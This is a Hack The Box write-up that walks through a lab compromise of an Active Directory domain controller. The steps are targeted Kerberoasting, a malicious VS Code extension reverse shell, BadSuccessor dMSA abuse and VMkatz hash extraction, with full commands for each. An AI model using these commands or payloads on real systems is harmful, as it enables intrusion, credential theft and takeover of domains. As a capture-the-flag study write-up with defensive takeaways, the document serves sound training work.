---
title: "HTB - Checkpoint Writeup"
date: 2026-11-01 00:00:00 -0400
categories: [Hack The Box, Active Directory]
tags: [active-directory, smb, kerberos, genericwrite, vsix, badsuccessor, dmsa, vmkatz, winrm]
image:
  path: /assets/img/checkpoint.png
permalink: /posts/checkpoint/
---

## Overview

Checkpoint is an Active Directory domain controller that demonstrates several chained Active Directory attack techniques.

The initial access is provided through the lab credentials for `alex.turner`. Enumeration reveals a `GenericWrite` relationship from `alex.turner` to the deleted `mark.davies` account. After restoring the deleted object, the relationship can be abused through targeted Kerberoasting to obtain access as `mark.davies`.

`mark.davies` has write access to the `DevDrop` SMB share, which is used to upload a malicious VS Code extension. When the extension is activated on the domain controller, it provides a shell as `ryan.brooks`.

From `ryan.brooks`, another `GenericWrite` relationship leads to `alex.turner`. The path can be escalated using the **BadSuccessor** DMSA technique. This allows a rogue delegated Managed Service Account to impersonate `svc_deploy`.

`svc_deploy` is an administrator and has access to a VM backup containing a memory snapshot. Using VMkatz against the memory image recovers the local `Administrator` NT hash, which can then be used for WinRM access and full domain-controller compromise.

> **Target:** `checkpoint.htb` (`10.129.123.116`)  
> **Platform:** Hack The Box  
> **OS:** Windows Server 2025 / Active Directory

---

## Initial Enumeration

The initial Nmap scan identifies the target as an Active Directory domain controller:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
5985/tcp  open  http
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf
```

The LDAP service identifies the domain:

```text
checkpoint.htb
```

The hostname is:

```text
DC01
```

---

## SMB Enumeration

Using the supplied `alex.turner` credentials, enumerate the SMB shares:

```bash
nxc smb 10.129.123.116 -u alex.turner -p '<LAB_PASSWORD>' --shares
```

The interesting shares are:

```text
ADMIN$
C$
DevDrop
IPC$
NETLOGON
SYSVOL
VMBackups
```

Initially, `DevDrop` is readable:

```text
DevDrop    READ
```

The share description is particularly interesting:

```text
VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
```

This suggests that files uploaded to `DevDrop` may eventually be consumed by VS Code.

---

## Active Directory Enumeration

BloodHound-style enumeration reveals an interesting relationship:

```text
ALEX.TURNER@CHECKPOINT.HTB
        |
        | GenericWrite
        v
MARK.DAVIES@CHECKPOINT.HTB
```

The account is a deleted/tombstoned object.

The AD enumeration tool identifies the attack path as:

```text
ALEX.TURNER → Generic Write → MARK.DAVIES
```

The deleted object can be restored from the Active Directory Recycle Bin.

After restoration, `mark.davies` becomes a viable target for the `GenericWrite` relationship.

---

## GenericWrite → Targeted Kerberoasting

Because the account has `GenericWrite`, an SPN can be temporarily added to the target account.

The targeted Kerberoast approach uses:

```text
SPN: http/mark.davies
```

The resulting Kerberos service ticket can then be extracted and cracked offline.

The important concept is that `GenericWrite` does not necessarily mean that the target password can simply be reset. However, the ability to modify attributes such as `servicePrincipalName` makes targeted Kerberoasting possible.

After obtaining the `mark.davies` credentials, authenticate to SMB:

```bash
nxc smb 10.129.123.116 -u mark.davies -p '<MARK_DAVIES_PASSWORD>' --shares
```

The important change is:

```text
DevDrop    READ,WRITE
```

This gives us a path to the next stage.

---

## DevDrop and the VS Code Extension

The `DevDrop` share is intended for approved VS Code `.vsix` packages.

A malicious VS Code extension can abuse the extension activation mechanism to execute PowerShell.

The extension contains the normal VSIX structure:

```text
[Content_Types].xml
extension.vsixmanifest
extension/package.json
extension/extension.js
```

A custom extension can be generated with:

```bash
python3 vsix_revshell.py -i <LHOST> -p <LPORT> -o evil.vsix
```

The resulting package can be uploaded to the writable share:

```bash
smbclient \\10.129.123.116\DevDrop -U 'mark.davies%<MARK_DAVIES_PASSWORD>'
```

Then:

```text
smb: \> put evil.vsix
```

Start a listener:

```bash
rlwrap nc -lvnp <LPORT>
```

When VS Code processes the extension, the PowerShell payload executes.

The resulting shell is:

```text
checkpoint\ryan.brooks
```

Verify:

```powershell
whoami
hostname
```

```text
checkpoint\ryan.brooks
DC01
```

---

## Ryan Brooks → Alex Turner

With the `ryan.brooks` shell, further AD enumeration reveals another important relationship:

```text
RYAN.BROOKS
      |
      | GenericWrite
      v
ALEX.TURNER
```

This provides another privilege-escalation path.

The environment is also suitable for the **BadSuccessor** attack because of the DMSA configuration.

---

## BadSuccessor / DMSA Abuse

[BadSuccessor](https://github.com/akamai/BadSuccessor) can be used to identify OUs where the current account has the necessary permissions.

The permissions enumeration shows:

```text
CHECKPOINT\ryan.brooks
    {OU=DMSAHolder,DC=checkpoint,DC=htb}

CHECKPOINT\alex.turner
    {OU=Employees,DC=checkpoint,DC=htb}
```

The relevant target account is:

```text
svc_deploy
```

Before proceeding, obtain a Kerberos ticket for the current user with Rubeus:

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

The resulting ticket can be converted to a Linux Kerberos credential cache:

```bash
cat ticket | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

Create the rogue DMSA:

```bash
bloodyad -u ryan.brooks -d checkpoint.htb \
  -H DC01.checkpoint.htb -i 10.129.123.116 \
  -k ccache=ticket.ccache \
  add badSuccessor evil_dmsa \
  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

The important result is:

```text
[+] Creating DMSA evil_dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
```

The attack produces a DMSA ticket and exposes the current and previous keys associated with the managed account.

---

## Access as svc_deploy

Verify the recovered credential material against LDAP and SMB:

```bash
nxc ldap checkpoint.htb -u svc_deploy -H '<RECOVERED_HASH>'
nxc smb checkpoint.htb -u svc_deploy -H '<RECOVERED_HASH>'
```

WinRM confirms administrative access:

```bash
nxc winrm checkpoint.htb -u svc_deploy -H '<RECOVERED_HASH>'
```

Result:

```text
[+] checkpoint.htb\svc_deploy:<hash> (admin)
```

Connect using Evil-WinRM:

```bash
evil-winrm -i checkpoint.htb -u svc_deploy -H '<RECOVERED_HASH>'
```

Verify:

```powershell
whoami
hostname
```

```text
checkpoint\svc_deploy
DC01
```

---

## VMBackups

As `svc_deploy`, the `VMBackups` share becomes readable.

Inside the backup is a memory-forensics directory containing:

```text
Windows Server 2019-000001.vmdk
Windows Server 2019-Snapshot1.vmem
Windows Server 2019-Snapshot1.vmsn
Windows Server 2019.nvram
Windows Server 2019.scoreboard
Windows Server 2019.vmdk
Windows Server 2019.vmsd
Windows Server 2019.vmx
Windows Server 2019.vmxf
```

The most interesting file is:

```text
Windows Server 2019-Snapshot1.vmem
```

A memory snapshot can contain credentials, authentication material, Kerberos tickets, and password hashes.

---

## Extracting Credentials with VMkatz

[VMkatz](https://github.com/nikaiw/VMkatz/) can extract credential material from VMware memory snapshots.

Execute it against the memory image:

```powershell
.\vmkatz.exe "\\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem"
```

VMkatz successfully recovers SAM and LSA material.

Among the recovered credentials is the local Administrator NT hash.

For a public writeup, keep the actual hash redacted:

```text
Administrator:<ADMINISTRATOR_NT_HASH>
```

---

## Administrator Access

Verify the recovered Administrator credential material:

```bash
nxc winrm checkpoint.htb \
  -u Administrator \
  -H '<ADMINISTRATOR_NT_HASH>'
```

The result confirms administrative access.

Connect with Evil-WinRM:

```bash
evil-winrm -i checkpoint.htb \
  -u Administrator \
  -H '<ADMINISTRATOR_NT_HASH>'
```

Verify:

```powershell
whoami
hostname
```

```text
checkpoint\administrator
DC01
```

At this point, full control of the domain controller has been obtained.

---

## Root Flag

The root flag is located under the Administrator profile:

```powershell
type C:\Users\max.palmer\Desktop\root.txt
```

Keep the flag redacted in the public version:

```text
[REDACTED]
```

---

## Attack Path Summary

```text
Initial alex.turner credentials
          |
          v
      SMB access
          |
          v
AD enumeration / GenericWrite
          |
          v
alex.turner
    |
    | GenericWrite
    v
mark.davies
    |
    | Restore deleted object
    v
Targeted Kerberoasting
    |
    v
mark.davies credentials
    |
    v
Writable DevDrop SMB share
    |
    v
Malicious VS Code .vsix
    |
    v
PowerShell execution
    |
    v
ryan.brooks shell
    |
    | GenericWrite / DMSA abuse
    v
BadSuccessor
    |
    v
svc_deploy impersonation
    |
    v
WinRM Administrator access
    |
    v
VMBackups
    |
    v
VMware memory snapshot
    |
    v
VMkatz
    |
    v
Administrator NT hash
    |
    v
Administrator WinRM
    |
    v
Domain Controller compromise
```

---

## Key Takeaways

### 1. GenericWrite is highly situational

`GenericWrite` does not automatically mean password reset. However, it can provide other useful primitives, such as modifying an SPN for targeted Kerberoasting.

### 2. Deleted AD objects should not be ignored

A deleted/tombstoned account can still appear in AD attack paths. Restoring the object may turn an otherwise theoretical relationship into an exploitable one.

### 3. Writable developer shares are dangerous

A share intended for approved VS Code extensions becomes an execution path when users or automated processes trust packages placed there.

### 4. DMSA permissions deserve careful review

The BadSuccessor technique demonstrates how delegated Managed Service Account functionality can become a privilege-escalation path when OU permissions are misconfigured.

### 5. Backups can contain credentials

The final escalation did not require attacking the Administrator account directly. A VM memory snapshot contained enough credential material to recover the Administrator NT hash.

### 6. Memory forensics can completely change an assessment

A backup containing `.vmem` files should be treated as highly sensitive. Memory captures can expose authentication secrets long after the original process or session has ended.

---

## References

- [BadSuccessor](https://github.com/akamai/BadSuccessor)
- [VMkatz](https://github.com/nikaiw/VMkatz)
- [ADScan](https://github.com/ADScanPro/adscan)
- [ad-reaper](https://github.com/mermehr/ad-reaper)
- [vsix_revshell](https://github.com/Goultarde/vsix_revshell.py)
